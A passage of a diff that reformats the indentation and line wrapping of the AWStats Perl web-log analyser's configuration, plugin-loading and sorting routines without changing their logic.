-				   scalar keys %HTMLOutput
-				   ? "</i>$tagunfont${tagbr}${tagbr}"
-				   : "" );
+				scalar keys %HTMLOutput
+				? "</i>$tagunfont${tagbr}${tagbr}"
+				: ""
+			);
 			print "\n";
 		}
 
@@ -1414,8 +1436,8 @@ sub OptimizeArray {
 		if ( $elemtoremove > -1 ) {
 			if ($Debug) {
 				debug(
-					  " Remove elem $elemtoremove - $arrayunreg[$elemtoremove]",
-					  4 );
+					" Remove elem $elemtoremove - $arrayunreg[$elemtoremove]",
+					4 );
 			}
 			splice @arrayunreg, $elemtoremove, 1;
 			$searchlist = $elemtoremove;
@@ -1561,11 +1583,11 @@ sub DayOfWeek {
 	if ( $month < 3 ) { $month += 10; $year--; }
 	else { $month -= 2; }
 	my $cent = sprintf( "%1i", ( $year / 100 ) );
-	my $y = ( $year % 100 );
-	my $dw = (
-			  sprintf( "%1i", ( 2.6 * $month ) - 0.2 ) + $day + $y +
-				sprintf( "%1i", ( $y / 4 ) ) + sprintf( "%1i", ( $cent / 4 ) ) -
-				( 2 * $cent ) ) % 7;
+	my $y    = ( $year % 100 );
+	my $dw   = (
+		sprintf( "%1i", ( 2.6 * $month ) - 0.2 ) + $day + $y +
+		  sprintf( "%1i", ( $y / 4 ) ) + sprintf( "%1i", ( $cent / 4 ) ) -
+		  ( 2 * $cent ) ) % 7;
 	$dw += 7 if ( $dw < 0 );
 	if ($Debug) { debug( " is $dw", 4 ); }
 	return $dw;
@@ -1631,21 +1653,21 @@ sub GetSessionRange {
 #------------------------------------------------------------------------------
 sub SortBrowsers {
 	my $a_family = $a;
-	my @a_ver = ();
+	my @a_ver    = ();
 	foreach my $family ( keys %BrowsersFamily ) {
 		if ( $a =~ /^$family/i ) {
 			$a =~ m/^(\D+)([\d\.]+)?$/;
 			$a_family = $1;
-			@a_ver = split(/\./, $2);
+			@a_ver = split( /\./, $2 );
 		}
 	}
 	my $b_family = $b;
-	my @b_ver = ();
+	my @b_ver    = ();
 	foreach my $family ( keys %BrowsersFamily ) {
 		if ( $b =~ /^$family/i ) {
 			$b =~ m/^(\D+)([\d\.]+)?$/;
 			$b_family = $1;
-			@b_ver = split(/\./, $2);
+			@b_ver = split( /\./, $2 );
 		}
 	}
 
@@ -1653,22 +1675,20 @@ sub SortBrowsers {
 	my $done    = 0;
 
 	$compare = $a_family cmp $b_family;
-	if ($compare != 0)
-	{
-		return $compare; 		
+	if ( $compare != 0 ) {
+		return $compare;
 	}
 
-	while ( !$done ) 
-	{
+	while ( !$done ) {
 		my $a_num = shift @a_ver || 0;
 		my $b_num = shift @b_ver || 0;
 
 		$compare = $a_num <=> $b_num;
-		if ($compare != 0
-		  || ( scalar(@a_ver) == 0 && scalar(@b_ver) == 0 && $compare == 0 ))
-		  {
-		  	$done = 1;
-		  }
+		if ( $compare != 0
+			|| ( scalar(@a_ver) == 0 && scalar(@b_ver) == 0 && $compare == 0 ) )
+		{
+			$done = 1;
+		}
 	}
 
 	return $compare;
@@ -1706,9 +1726,9 @@ sub Read_Config {
 	}
 	else {
 		@PossibleConfigDir = (
-							   "$DIR",                   "/etc/awstats",
-							   "/usr/local/etc/awstats", "/etc",
-							   "/etc/opt/awstats"
+			"$DIR",                   "/etc/awstats",
+			"/usr/local/etc/awstats", "/etc",
+			"/etc/opt/awstats"
 		);
 	}
 
@@ -1742,16 +1762,16 @@ sub Read_Config {
 	# If parameter NotPageList not found, init for backward compatibility
 	if ( !$FoundNotPageList ) {
 		%NotPageList = (
-						 'css'   => 1,
-						 'js'    => 1,
-						 'class' => 1,
-						 'gif'   => 1,
-						 'jpg'   => 1,
-						 'jpeg'  => 1,
-						 'png'   => 1,
-						 'bmp'   => 1,
-						 'ico'   => 1,
-						 'swf'   => 1
+			'css'   => 1,
+			'js'    => 1,
+			'class' => 1,
+			'gif'   => 1,
+			'jpg'   => 1,
+			'jpeg'  => 1,
+			'png'   => 1,
+			'bmp'   => 1,
+			'ico'   => 1,
+			'swf'   => 1
 		);
 	}
 
@@ -1781,7 +1801,8 @@ sub Parse_Config {
 	my $conflinenb     = 0;
 
 	if ( $level > 10 ) {
-		error(    "$PROG can't read down more than 10 level of includes. Check that no 'included' config files include their parent config file (this cause infinite loop)."
+		error(
+"$PROG can't read down more than 10 level of includes. Check that no 'included' config files include their parent config file (this cause infinite loop)."
 		);
 	}
 
@@ -1819,7 +1840,8 @@ sub Parse_Config {
 				}
 			}
 			if ( $level > 1 ) {
-				warning(        "Warning: Perl versions before 5.6 cannot handle nested includes"
+				warning(
+"Warning: Perl versions before 5.6 cannot handle nested includes"
 				);
 				next;
 			}
@@ -1844,12 +1866,14 @@ sub Parse_Config {
 
 		# If not a param=value, try with next line
 		if ( !$param ) {
-			warning(     "Warning: Syntax error line $conflinenb in file '$configFile'. Config line is ignored."
+			warning(
+"Warning: Syntax error line $conflinenb in file '$configFile'. Config line is ignored."
 			);
 			next;
 		}
 		if ( !defined $value ) {
-			warning(     "Warning: Syntax error line $conflinenb in file '$configFile'. Config line is ignored."
+			warning(
+"Warning: Syntax error line $conflinenb in file '$configFile'. Config line is ignored."
 			);
 			next;
 		}
@@ -1888,7 +1912,8 @@ sub Parse_Config {
 			foreach my $elem ( split( /\s+/, $value ) ) {
 				if ( $elem =~ s/^\@// ) {    # If list of hostaliases in a file
 					open( DATAFILE, "<$elem" )
-					  || error(        "Failed to open file '$elem' declared in HostAliases parameter"
+					  || error(
+"Failed to open file '$elem' declared in HostAliases parameter"
 					  );
 					my @val = map( /^(.*)$/i, <DATAFILE> );
 					push @HostAliases, map { qr/^$_$/i } @val;
@@ -2128,14 +2153,14 @@ sub Read_Ref_Data {
 	while ( my $file = shift ) { push @FileListToLoad, "$file.pm"; }
 	if ($Debug) {
 		debug( "Call to Read_Ref_Data with files to load: "
-			   . ( join( ',', @FileListToLoad ) ) );
+			  . ( join( ',', @FileListToLoad ) ) );
 	}
 	foreach my $file (@FileListToLoad) {
 		foreach my $dir (@PossibleLibDir) {
 			my $searchdir = $dir;
-			if (    $searchdir
-				 && ( !( $searchdir =~ /\/$/ ) )
-				 && ( !( $searchdir =~ /\\$/ ) ) )
+			if (   $searchdir
+				&& ( !( $searchdir =~ /\/$/ ) )
+				&& ( !( $searchdir =~ /\\$/ ) ) )
 			{
 				$searchdir .= "/";
 			}
@@ -2144,7 +2169,8 @@ sub Read_Ref_Data {
 				if ( -s "${searchdir}${file}" ) {
 					$FilePath{$file} = "${searchdir}${file}";
 					if ($Debug) {
-						debug(                "Call to Read_Ref_Data [FilePath{$file}=\"$FilePath{$file}\"]"
+						debug(
+"Call to Read_Ref_Data [FilePath{$file}=\"$FilePath{$file}\"]"
 						);
 					}
 
@@ -2172,29 +2198,29 @@ sub Read_Ref_Data {
 
 	# Sanity check (if loaded)
 	if ( ( scalar keys %OSHashID )
-		 && @OSSearchIDOrder != scalar keys %OSHashID )
+		&& @OSSearchIDOrder != scalar keys %OSHashID )
 	{
-		error(   "Not same number of records of OSSearchIDOrder ("
-			   . (@OSSearchIDOrder)
-			   . " entries) and OSHashID ("
-			   . ( scalar keys %OSHashID )
-			   . " entries) in OS database. Check your file "
-			   . $FilePath{"operating_systems.pm"} );
+		error(  "Not same number of records of OSSearchIDOrder ("
+			  . (@OSSearchIDOrder)
+			  . " entries) and OSHashID ("
+			  . ( scalar keys %OSHashID )
+			  . " entries) in OS database. Check your file "
+			  . $FilePath{"operating_systems.pm"} );
 	}
 	if (
-		 ( scalar keys %SearchEnginesHashID )
-		 && ( @SearchEnginesSearchIDOrder_list1 +
-			  @SearchEnginesSearchIDOrder_list2 +
-			  @SearchEnginesSearchIDOrder_listgen ) != scalar
-		 keys %SearchEnginesHashID
+		( scalar keys %SearchEnginesHashID )
+		&& ( @SearchEnginesSearchIDOrder_list1 +
+			@SearchEnginesSearchIDOrder_list2 +
+			@SearchEnginesSearchIDOrder_listgen ) != scalar
+		keys %SearchEnginesHashID
 	  )
 	{
 		error(
 "Not same number of records of SearchEnginesSearchIDOrder_listx (total is "
 			  . (
-				  @SearchEnginesSearchIDOrder_list1 +
-					@SearchEnginesSearchIDOrder_list2 +
-					@SearchEnginesSearchIDOrder_listgen
+				@SearchEnginesSearchIDOrder_list1 +
+				  @SearchEnginesSearchIDOrder_list2 +
+				  @SearchEnginesSearchIDOrder_listgen
 			  )
 			  . " entries) and SearchEnginesHashID ("
 			  . ( scalar keys %SearchEnginesHashID )
@@ -2203,19 +2229,29 @@ sub Read_Ref_Data {
 			  . " is up to date."
 		);
 	}
-	if ((scalar keys %BrowsersHashIDLib) && @BrowsersSearchIDOrder != (scalar keys %BrowsersHashIDLib) - 4) { error("Not same number of records of BrowsersSearchIDOrder (".(@BrowsersSearchIDOrder)." entries) and BrowsersHashIDLib (".((scalar keys %BrowsersHashIDLib) - 4)." entries without msie,netscape,firefox,svn,opera,safari,chrome,konqueror) in Browsers database. May be you updated AWStats without updating browsers.pm file or you made changed into browsers.pm not correctly. Check your file ".$FilePath{"browsers.pm"}." is up to date."); }
+	if ( ( scalar keys %BrowsersHashIDLib )
+		&& @BrowsersSearchIDOrder != ( scalar keys %BrowsersHashIDLib ) - 4 )
+	{
+		error(  "Not same number of records of BrowsersSearchIDOrder ("
+			  . (@BrowsersSearchIDOrder)
+			  . " entries) and BrowsersHashIDLib ("
+			  . ( ( scalar keys %BrowsersHashIDLib ) - 4 )
+			  . " entries without msie,netscape,firefox,svn,opera,safari,chrome,konqueror) in Browsers database. May be you updated AWStats without updating browsers.pm file or you made changed into browsers.pm not correctly. Check your file "
+			  . $FilePath{"browsers.pm"}
+			  . " is up to date." );
+	}
 	if (
-		 ( scalar keys %RobotsHashIDLib )
-		 && ( @RobotsSearchIDOrder_list1 + @RobotsSearchIDOrder_list2 +
-			  @RobotsSearchIDOrder_listgen ) !=
-		 ( scalar keys %RobotsHashIDLib ) - 1
+		( scalar keys %RobotsHashIDLib )
+		&& ( @RobotsSearchIDOrder_list1 + @RobotsSearchIDOrder_list2 +
+			@RobotsSearchIDOrder_listgen ) !=
+		( scalar keys %RobotsHashIDLib ) - 1
 	  )
 	{
 		error(
 			"Not same number of records of RobotsSearchIDOrder_listx (total is "
 			  . (
-				  @RobotsSearchIDOrder_list1 + @RobotsSearchIDOrder_list2 +
-					@RobotsSearchIDOrder_listgen
+				@RobotsSearchIDOrder_list1 + @RobotsSearchIDOrder_list2 +
+				  @RobotsSearchIDOrder_listgen
 			  )
 			  . " entries) and RobotsHashIDLib ("
 			  . ( ( scalar keys %RobotsHashIDLib ) - 1 )
@@ -2244,9 +2280,9 @@ sub Read_Language_Data {
 	my $FileLang = '';
 	foreach (@PossibleLangDir) {
 		my $searchdir = $_;
-		if (    $searchdir
-			 && ( !( $searchdir =~ /\/$/ ) )
-			 && ( !( $searchdir =~ /\\$/ ) ) )
+		if (   $searchdir
+			&& ( !( $searchdir =~ /\/$/ ) )
+			&& ( !( $searchdir =~ /\\$/ ) ) )
 		{
 			$searchdir .= "/";
 		}
@@ -2260,9 +2296,9 @@ sub Read_Language_Data {
 	if ( !$FileLang ) {
 		foreach (@PossibleLangDir) {
 			my $searchdir = $_;
-			if (    $searchdir
-				 && ( !( $searchdir =~ /\/$/ ) )
-				 && ( !( $searchdir =~ /\\$/ ) ) )
+			if (   $searchdir
+				&& ( !( $searchdir =~ /\/$/ ) )
+				&& ( !( $searchdir =~ /\\$/ ) ) )
 			{
 				$searchdir .= "/";
 			}
@@ -2301,7 +2337,8 @@ sub Read_Language_Data {
 		close(LANG);
 	}
 	else {
-		warning(  "Warning: Can't find language files for \"$_[0]\". English will be used."
+		warning(
+"Warning: Can't find language files for \"$_[0]\". English will be used."
 		);
 	}
 
@@ -2329,9 +2366,9 @@ sub Substitute_Tags {
 	if ($Debug) { debug("Call to Substitute_Tags on $SourceString"); }
 
 	my %MonthNumLibEn = (
-						  "01", "Jan", "02", "Feb", "03", "Mar", "04", "Apr",
-						  "05", "May", "06", "Jun", "07", "Jul", "08", "Aug",
-						  "09", "Sep", "10", "Oct", "11", "Nov", "12", "Dec"
+		"01", "Jan", "02", "Feb", "03", "Mar", "04", "Apr",
+		"05", "May", "06", "Jun", "07", "Jul", "08", "Aug",
+		"09", "Sep", "10", "Oct", "11", "Nov", "12", "Dec"
 	);
 
 	while ( $SourceString =~ /%([ymdhwYMDHWNSO]+)-(\(\d+\)|\d+)/ ) {
@@ -2350,15 +2387,15 @@ sub Substitute_Tags {
 
 		# Get older time
 		my (
-			 $oldersec,   $oldermin,  $olderhour, $olderday,
-			 $oldermonth, $olderyear, $olderwday, $olderyday
+			$oldersec,   $oldermin,  $olderhour, $olderday,
+			$oldermonth, $olderyear, $olderwday, $olderyday
 		  )
 		  = localtime( $starttime - ( $timephasenb * 3600 ) );
 		my $olderweekofmonth = int( $olderday / 7 );
 		my $olderweekofyear  =
 		  int(
-			 ( $olderyday - 1 + 6 - ( $olderwday == 0 ? 6 : $olderwday - 1 ) ) /
-			   7 ) + 1;
+			( $olderyday - 1 + 6 - ( $olderwday == 0 ? 6 : $olderwday - 1 ) ) /
+			  7 ) + 1;
 		if ( $olderweekofyear > 52 ) { $olderweekofyear = 1; }
 		my $olderdaymod = $olderday % 7;
 		$olderwday++;
@@ -2496,14 +2533,14 @@ sub Check_Config {
 		debug( " BuildReportFormat=$BuildReportFormat",   2 );
 		debug( " BuildHistoryFormat=$BuildHistoryFormat", 2 );
 		debug(
-			   " URLWithQueryWithOnlyFollowingParameters="
-				 . ( join( ',', @URLWithQueryWithOnly ) ),
-			   2
+			" URLWithQueryWithOnlyFollowingParameters="
+			  . ( join( ',', @URLWithQueryWithOnly ) ),
+			2
 		);
 		debug(
-			   " URLWithQueryWithoutFollowingParameters="
-				 . ( join( ',', @URLWithQueryWithout ) ),
-			   2
+			" URLWithQueryWithoutFollowingParameters="
+			  . ( join( ',', @URLWithQueryWithout ) ),
+			2
 		);
 	}
 
@@ -2518,7 +2555,8 @@ sub Check_Config {
 		error("LogFormat parameter is not defined in config/domain file");
 	}
 	if ( $LogFormat =~ /^\d$/ && $LogFormat !~ /[1-6]/ ) {
-		error(    "LogFormat parameter is wrong in config/domain file. Value is '$LogFormat' (should be 1,2,3,4,5 or a 'personalized AWStats log format string')"
+		error(
+"LogFormat parameter is wrong in config/domain file. Value is '$LogFormat' (should be 1,2,3,4,5 or a 'personalized AWStats log format string')"
 		);
 	}
 	$LogSeparator ||= "\\s";
@@ -2526,11 +2564,13 @@ sub Check_Config {
 	$DirCgi       ||= '/cgi-bin';
 	$DirIcons     ||= '/icon';
 	if ( $DNSLookup !~ /[0-2]/ ) {
-		error(    "DNSLookup parameter is wrong in config/domain file. Value is '$DNSLookup' (should be 0,1 or 2)"
+		error(
+"DNSLookup parameter is wrong in config/domain file. Value is '$DNSLookup' (should be 0,1 or 2)"
 		);
 	}
 	if ( !$SiteDomain ) {
-		error(    "SiteDomain parameter not defined in your config/domain file. You must edit it for using this version of AWStats."
+		error(
+"SiteDomain parameter not defined in your config/domain file. You must edit it for using this version of AWStats."
 		);
 	}
 	if ( $AllowToUpdateStatsFromBrowser !~ /[0-1]/ ) {
@@ -2544,7 +2584,8 @@ sub Check_Config {
 	$DNSStaticCacheFile     ||= 'dnscache.txt';
 	$DNSLastUpdateCacheFile ||= 'dnscachelastupdate.txt';
 	if ( $DNSStaticCacheFile eq $DNSLastUpdateCacheFile ) {
-		error(    "DNSStaticCacheFile and DNSLastUpdateCacheFile must have different values."
+		error(
+"DNSStaticCacheFile and DNSLastUpdateCacheFile must have different values."
 		);
 	}
 	if ( $AllowAccessFromWebToAuthenticatedUsersOnly !~ /[0-1]/ ) {
@@ -2608,8 +2649,8 @@ sub Check_Config {
 		if ( $ExtraStatTypes[$extracpt] !~ /[PHBL]/ ) {
 			$ExtraStatTypes[$extracpt] = 'PHBL';
 		}
-		if (    $MaxNbOfExtra[$extracpt] !~ /^\d+$/
-			 || $MaxNbOfExtra[$extracpt] < 0 )
+		if (   $MaxNbOfExtra[$extracpt] !~ /^\d+$/
+			|| $MaxNbOfExtra[$extracpt] < 0 )
 		{
 			$MaxNbOfExtra[$extracpt] = 20;
 		}
@@ -2618,7 +2659,8 @@ sub Check_Config {
 			$MinHitExtra[$extracpt] = 1;
 		}
 		if ( !$ExtraFirstColumnValues[$extracpt] ) {
-			error(       "Extra section number $extracpt is defined without ExtraSectionFirstColumnValues$extracpt parameter"
+			error(
+"Extra section number $extracpt is defined without ExtraSectionFirstColumnValues$extracpt parameter"
 			);
 		}
 		if ( !$ExtraFirstColumnFormat[$extracpt] ) {
@@ -2674,35 +2716,35 @@ sub Check_Config {
 		$AddDataArrayShowHoursStats = 1;
 	}
 	my @maxnboflist = (
-						'Domain',           'HostsShown',
-						'LoginShown',       'RobotShown',
-						'WormsShown',       'PageShown',
-						'OsShown',          'BrowsersShown',
-						'ScreenSizesShown', 'RefererShown',
-						'KeyphrasesShown',  'KeywordsShown',
-						'EMailsShown'
+		'Domain',           'HostsShown',
+		'LoginShown',       'RobotShown',
+		'WormsShown',       'PageShown',
+		'OsShown',          'BrowsersShown',
+		'ScreenSizesShown', 'RefererShown',
+		'KeyphrasesShown',  'KeywordsShown',
+		'EMailsShown'
 	);
 	my @maxnboflistdefaultval =
 	  ( 10, 10, 10, 10, 5, 10, 10, 10, 5, 10, 10, 10, 20 );
 	foreach my $i ( 0 .. ( @maxnboflist - 1 ) ) {
-		if (    !$MaxNbOf{ $maxnboflist[$i] }
-			 || $MaxNbOf{ $maxnboflist[$i] } !~ /^\d+$/
-			 || $MaxNbOf{ $maxnboflist[$i] } < 1 )
+		if (   !$MaxNbOf{ $maxnboflist[$i] }
+			|| $MaxNbOf{ $maxnboflist[$i] } !~ /^\d+$/
+			|| $MaxNbOf{ $maxnboflist[$i] } < 1 )
 		{
 			$MaxNbOf{ $maxnboflist[$i] } = $maxnboflistdefaultval[$i];
 		}
 	}
 	my @minhitlist = (
-					   'Domain',     'Host',  'Login',     'Robot',
-					   'Worm',       'File',  'Os',        'Browser',
-					   'ScreenSize', 'Refer', 'Keyphrase', 'Keyword',
-					   'EMail'
+		'Domain',     'Host',  'Login',     'Robot',
+		'Worm',       'File',  'Os',        'Browser',
+		'ScreenSize', 'Refer', 'Keyphrase', 'Keyword',
+		'EMail'
 	);
 	my @minhitlistdefaultval = ( 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 );
 	foreach my $i ( 0 .. ( @minhitlist - 1 ) ) {
-		if (    !$MinHit{ $minhitlist[$i] }
-			 || $MinHit{ $minhitlist[$i] } !~ /^\d+$/
-			 || $MinHit{ $minhitlist[$i] } < 1 )
+		if (   !$MinHit{ $minhitlist[$i] }
+			|| $MinHit{ $minhitlist[$i] } !~ /^\d+$/
+			|| $MinHit{ $minhitlist[$i] } < 1 )
 		{
 			$MinHit{ $minhitlist[$i] } = $minhitlistdefaultval[$i];
 		}
@@ -2804,7 +2846,7 @@ sub Check_Config {
 	foreach my $extranum ( 1 .. @ExtraName - 1 ) {
 		my $part = 0;
 		foreach my $conditioncouple (
-							 split( /\s*\|\|\s*/, $ExtraCondition[$extranum] ) )
+			split( /\s*\|\|\s*/, $ExtraCondition[$extranum] ) )
 		{
 			my ( $conditiontype, $conditiontypeval ) =
 			  split( /[,:]/, $conditioncouple, 2 );
@@ -2819,7 +2861,7 @@ sub Check_Config {
 		}
 		$part = 0;
 		foreach my $rowkeycouple (
-					 split( /\s*\|\|\s*/, $ExtraFirstColumnValues[$extranum] ) )
+			split( /\s*\|\|\s*/, $ExtraFirstColumnValues[$extranum] ) )
 		{
 			my ( $rowkeytype, $rowkeytypeval ) =
 			  split( /[,:]/, $rowkeycouple, 2 );
@@ -2849,54 +2891,56 @@ sub Check_Config {
 
 		foreach my $extranum ( 1 .. @ExtraName - 1 ) {
 			debug(
-				   " ExtraCodeFilter[$extranum] is array "
-					 . join( ',', @{ $ExtraCodeFilter[$extranum] } ),
-				   2
+				" ExtraCodeFilter[$extranum] is array "
+				  . join( ',', @{ $ExtraCodeFilter[$extranum] } ),
+				2
 			);
 			debug(
-				   " ExtraConditionType[$extranum] is array "
-					 . join( ',', @{ $ExtraConditionType[$extranum] } ),
-				   2
+				" ExtraConditionType[$extranum] is array "
+				  . join( ',', @{ $ExtraConditionType[$extranum] } ),
+				2
 			);
 			debug(
-				   " ExtraConditionTypeVal[$extranum] is array "
-					 . join( ',', @{ $ExtraConditionTypeVal[$extranum] } ),
-				   2
+				" ExtraConditionTypeVal[$extranum] is array "
+				  . join( ',', @{ $ExtraConditionTypeVal[$extranum] } ),
+				2
 			);
 			debug(
-				   " ExtraFirstColumnFunction[$extranum] is array "
-					 . join( ',', @{ $ExtraFirstColumnFunction[$extranum] } ),
-				   2
+				" ExtraFirstColumnFunction[$extranum] is array "
+				  . join( ',', @{ $ExtraFirstColumnFunction[$extranum] } ),
+				2
 			);
 			debug(
-				   " ExtraFirstColumnValuesType[$extranum] is array "
-					 . join( ',', @{ $ExtraFirstColumnValuesType[$extranum] } ),
-				   2
+				" ExtraFirstColumnValuesType[$extranum] is array "
+				  . join( ',', @{ $ExtraFirstColumnValuesType[$extranum] } ),
+				2
 			);
 			debug(
-				   " ExtraFirstColumnValuesTypeVal[$extranum] is array "
-					 . join( ',',
-							 @{ $ExtraFirstColumnValuesTypeVal[$extranum] } ),
-				   2
+				" ExtraFirstColumnValuesTypeVal[$extranum] is array "
+				  . join( ',', @{ $ExtraFirstColumnValuesTypeVal[$extranum] } ),
+				2
 			);
 		}
 	}
 
 # Deny URLWithQueryWithOnlyFollowingParameters and URLWithQueryWithoutFollowingParameters both set
 	if ( @URLWithQueryWithOnly && @URLWithQueryWithout ) {
-		error(    "URLWithQueryWithOnlyFollowingParameters and URLWithQueryWithoutFollowingParameters can't be both set at the same time"
+		error(
+"URLWithQueryWithOnlyFollowingParameters and URLWithQueryWithoutFollowingParameters can't be both set at the same time"
 		);
 	}
 
 	# Deny $ShowHTTPErrorsStats and $ShowSMTPErrorsStats both set
 	if ( $ShowHTTPErrorsStats && $ShowSMTPErrorsStats ) {
-		error(    "ShowHTTPErrorsStats and ShowSMTPErrorsStats can't be both set at the same time"
+		error(
+"ShowHTTPErrorsStats and ShowSMTPErrorsStats can't be both set at the same time"
 		);
 	}
 
   # Deny LogFile if contains a pipe and PurgeLogFile || ArchiveLogRecords set on
 	if ( ( $PurgeLogFile || $ArchiveLogRecords ) && $LogFile =~ /\|\s*$/ ) {
-		error(    "A pipe in log file name is not allowed if PurgeLogFile and ArchiveLogRecords are not set to 0"
+		error(
+"A pipe in log file name is not allowed if PurgeLogFile and ArchiveLogRecords are not set to 0"
 		);
 	}
 
@@ -2906,12 +2950,14 @@ sub Check_Config {
 			if ($Debug) { debug( " Make directory $DirData", 2 ); }
 			my $mkdirok = mkdir "$DirData", 0766;
 			if ( !$mkdirok ) {
-				error(          "$PROG failed to create directory DirData (DirData=\"$DirData\", CreateDirDataIfNotExists=$CreateDirDataIfNotExists)."
+				error(
+"$PROG failed to create directory DirData (DirData=\"$DirData\", CreateDirDataIfNotExists=$CreateDirDataIfNotExists)."
 				);
 			}
 		}
 		else {
-			error(       "AWStats database directory defined in config file by 'DirData' parameter ($DirData) does not exist or is not writable."
+			error(
+"AWStats database directory defined in config file by 'DirData' parameter ($DirData) does not exist or is not writable."
 			);
 		}
 	}
@@ -2978,9 +3024,9 @@ sub Read_Plugins {
 # Redhat :                                  "/usr/local/awstats/wwwroot/cgi-bin/plugins"
 # Debian package :                    		"/usr/share/awstats/plugins"
 	my @PossiblePluginsDir = (
-							   "$DIR/plugins",
-							   "/usr/local/awstats/wwwroot/cgi-bin/plugins",
-							   "/usr/share/awstats/plugins"
+		"$DIR/plugins",
+		"/usr/local/awstats/wwwroot/cgi-bin/plugins",
+		"/usr/share/awstats/plugins"
 	);
 	my %DirAddedInINC = ();
 
@@ -2988,7 +3034,7 @@ sub Read_Plugins {
 #foreach my $key (keys %NoLoadPlugin) { if ($NoLoadPlugin{$key} < 0) { push @PluginsToLoad, $key; } }
 	if ($Debug) {
 		debug(
-			 "Call to Read_Plugins with list: " . join( ',', @PluginsToLoad ) );
+			"Call to Read_Plugins with list: " . join( ',', @PluginsToLoad ) );
 	}
 	foreach my $plugininfo (@PluginsToLoad) {
 		my ( $pluginfile, $pluginparam ) = split( /\s+/, $plugininfo, 2 );
@@ -3000,7 +3046,8 @@ sub Read_Plugins {
 		                        # Check if plugin is not disabled
 		if ( $NoLoadPlugin{$pluginname} && $NoLoadPlugin{$pluginname} > 0 ) {
 			if ($Debug) {
-				debug(          " Plugin load for '$pluginfile' has been disabled from parameters"
+				debug(
+" Plugin load for '$pluginfile' has been disabled from parameters"
 				);
 			}
 			next;
@@ -3009,48 +3056,48 @@ sub Read_Plugins {
 			if ( !$PluginsLoaded{'init'}{"$pluginname"} )
 			{                   # Plugin not already loaded
 				my %pluginisfor = (
-									'timehires'            => 'u',
-									'ipv6'                 => 'u',
-									'hashfiles'            => 'u',
-									'geoipfree'            => 'u',
-									'geoip'                => 'ou',
-									'geoip_region_maxmind' => 'mou',
-									'geoip_city_maxmind'   => 'mou',
-									'geoip_isp_maxmind'    => 'mou',
-									'geoip_org_maxmind'    => 'mou',
-									'timezone'             => 'ou',
-									'decodeutfkeys'        => 'o',
-									'hostinfo'             => 'o',
-									'rawlog'               => 'o',
-									'userinfo'             => 'o',
-									'urlalias'             => 'o',
-									'tooltips'             => 'o'
+					'timehires'            => 'u',
+					'ipv6'                 => 'u',
+					'hashfiles'            => 'u',
+					'geoipfree'            => 'u',
+					'geoip'                => 'ou',
+					'geoip_region_maxmind' => 'mou',
+					'geoip_city_maxmind'   => 'mou',
+					'geoip_isp_maxmind'    => 'mou',
+					'geoip_org_maxmind'    => 'mou',
+					'timezone'             => 'ou',
+					'decodeutfkeys'        => 'o',
+					'hostinfo'             => 'o',
+					'rawlog'               => 'o',
+					'userinfo'             => 'o',
+					'urlalias'             => 'o',
+					'tooltips'             => 'o'
 				);
 				if ( $pluginisfor{$pluginname} )
 				{    # If it's a known plugin, may be we don't need to load it
 					 # Do not load "menu handler plugins" if output only and mainleft frame
-					if (    !$UpdateStats
-						 && scalar keys %HTMLOutput
-						 && $FrameName eq 'mainleft'
-						 && $pluginisfor{$pluginname} !~ /m/ )
+					if (   !$UpdateStats
+						&& scalar keys %HTMLOutput
+						&& $FrameName eq 'mainleft'
+						&& $pluginisfor{$pluginname} !~ /m/ )
 					{
 						$PluginsLoaded{'init'}{"$pluginname"} = 1;
 						next;
 					}
 
 					# Do not load "update plugins" if output only
-					if (    !$UpdateStats
-						 && scalar keys %HTMLOutput
-						 && $pluginisfor{$pluginname} !~ /o/ )
+					if (   !$UpdateStats
+						&& scalar keys %HTMLOutput
+						&& $pluginisfor{$pluginname} !~ /o/ )
 					{
 						$PluginsLoaded{'init'}{"$pluginname"} = 1;
 						next;
 					}
 
 					# Do not load "output plugins" if update only
-					if (    $UpdateStats
-						 && !scalar keys %HTMLOutput
-						 && $pluginisfor{$pluginname} !~ /u/ )
+					if (   $UpdateStats
+						&& !scalar keys %HTMLOutput
+						&& $pluginisfor{$pluginname} !~ /u/ )
 					{
 						$PluginsLoaded{'init'}{"$pluginname"} = 1;
 						next;
@@ -3060,9 +3107,9 @@ sub Read_Plugins {
 				# Load plugin
 				foreach my $dir (@PossiblePluginsDir) {
 					my $searchdir = $dir;
-					if (    $searchdir
-						 && ( !( $searchdir =~ /\/$/ ) )
-						 && ( !( $searchdir =~ /\\$/ ) ) )
+					if (   $searchdir
+						&& ( !( $searchdir =~ /\/$/ ) )
+						&& ( !( $searchdir =~ /\\$/ ) ) )
 					{
 						$searchdir .= "/";
 					}
@@ -3093,7 +3140,8 @@ sub Read_Plugins {
 						if ( !$loadret || $loadret =~ /^error/i ) {
 
 							# Load failed, we stop here
-							error(                   "Plugin load for plugin '$pluginname' failed with return code: $loadret"
+							error(
+"Plugin load for plugin '$pluginname' failed with return code: $loadret"
 							);
 						}
 						my $ret;    # To get init return
@@ -3122,15 +3170,15 @@ sub Read_Plugins {
 
 							# Some functions can only be plugged once
 							my @uniquefunc = (
-											   'GetCountryCodeByName',
-											   'GetCountryCodeByAddr',
-											   'ChangeTime',
-											   'GetTimeZoneTitle',
-											   'GetTime',
-											   'SearchFile',
-											   'LoadCache',
-											   'SaveHash',
-											   'ShowMenu'
+								'GetCountryCodeByName',
+								'GetCountryCodeByAddr',
+								'ChangeTime',
+								'GetTimeZoneTitle',
+								'GetTime',
+								'SearchFile',
+								'LoadCache',
+								'SaveHash',
+								'ShowMenu'
 							);
 							my $isuniquefunc = 0;
 							foreach my $function (@uniquefunc) {
@@ -3138,9 +3186,10 @@ sub Read_Plugins {
 
 	# We try to load a 'unique' function, so we check and stop if already loaded
 									foreach my $otherpluginname (
-											 keys %{ $PluginsLoaded{"$elem"} } )
+										keys %{ $PluginsLoaded{"$elem"} } )
 									{
-										error(                            "Conflict between plugin '$pluginname' and '$otherpluginname'. They both implements the 'must be unique' function '$elem'.\nYou must choose between one of them. Using together is not possible."
+										error(
+"Conflict between plugin '$pluginname' and '$otherpluginname'. They both implements the 'must be unique' function '$elem'.\nYou must choose between one of them. Using together is not possible."
 										);
 									}
 									$isuniquefunc = 1;
@@ -3175,7 +3224,8 @@ sub Read_Plugins {
 				}
 			}
 			else {
-				warning(        "Warning: Tried to load plugin \"$pluginname\" twice. Fix config file."
+				warning(
+"Warning: Tried to load plugin \"$pluginname\" twice. Fix config file."
 				);
 			}
 		}
@@ -3185,8 +3235,8 @@ sub Read_Plugins {
 	}
 
 # In output mode, geo ip plugins are not loaded, so message changes are done here (can't be done in plugin init function)
-	if (    $PluginsLoaded{'init'}{'geoip'}
